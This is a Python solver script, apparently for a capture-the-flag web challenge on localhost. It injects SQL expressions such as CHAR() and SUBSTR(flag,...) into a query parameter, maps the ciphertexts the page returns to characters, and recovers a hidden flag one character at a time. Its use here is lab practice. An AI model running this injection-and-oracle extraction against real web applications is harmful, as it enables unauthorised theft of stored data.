import requests
from bs4 import BeautifulSoup
import base64

# Generate ciphertext dictionary for each printable ASCII character
def generate_cipher_dict(target_url):
    cipher_dict = {}
    for ascii_code in range(32, 127):  # Printable ASCII range
        char = chr(ascii_code)
        params = {'query': f"CHAR({ascii_code})"}
        response = requests.get(target_url, params=params)
        soup = BeautifulSoup(response.text, 'html.parser')
        ct_pre = soup.find_all('pre')[-1].text  # Get last <pre> tag (ciphertext)
        ct = base64.b64decode(ct_pre)
        cipher_dict[ct] = char
        print(f"Generated: {char} -> {ct_pre}")
    return cipher_dict

# Retrieve flag by brute-forcing each character
def extract_flag(target_url, cipher_dict):
    flag = []
    pos = 1
    while True:
        params = {'query': f"SUBSTR(flag,{pos},1)"}
        response = requests.get(target_url, params=params)
        soup = BeautifulSoup(response.text, 'html.parser')
        ct_pre = soup.find_all('pre')[-1].text
        ct = base64.b64decode(ct_pre)
        char = cipher_dict.get(ct, None)
        if not char:
            break
        flag.append(char)
        print(f"Position {pos}: {char} -> Current Flag: {''.join(flag)}")
        pos += 1
    return ''.join(flag)

if __name__ == "__main__":
    target_url = "http://challenge.localhost:80"
    cipher_dict = generate_cipher_dict(target_url)
    flag = extract_flag(target_url, cipher_dict)
    print(f"Decrypted Flag: {flag}")
